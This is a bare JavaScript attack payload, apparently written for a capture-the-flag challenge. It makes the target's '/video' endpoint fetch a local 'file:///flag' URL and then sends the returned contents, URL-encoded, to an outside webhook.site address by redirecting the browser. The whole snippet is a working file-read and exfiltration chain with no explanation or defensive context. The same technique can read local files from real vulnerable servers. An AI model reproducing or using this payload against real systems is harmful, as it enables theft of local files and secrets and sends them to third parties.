fetch('/video?url=file%3A%2F%2F%2Fflag&format=mp4').then((res) => {
    res.text().then((test) => {
        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
    }).catch((owo) => {
        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error2`;
    })
}).catch((owo) => {
    window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error`;
})